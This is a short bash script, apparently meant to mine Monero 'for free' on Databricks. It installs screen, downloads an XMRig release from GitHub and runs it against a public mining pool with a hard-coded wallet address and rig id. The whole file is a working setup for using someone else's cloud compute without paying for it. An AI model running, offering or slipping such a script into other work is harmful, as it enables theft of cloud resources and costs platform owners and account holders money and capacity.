#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 44Gcsim6a2UF9sr845hSYdWrPJf8SLitSMuzZfY3kVdqha5q7vCJbXwFc1GkHpvrZdEdkfCufofinJFbZBqQhyznSHv6uMP -k --tls --rig-id aank
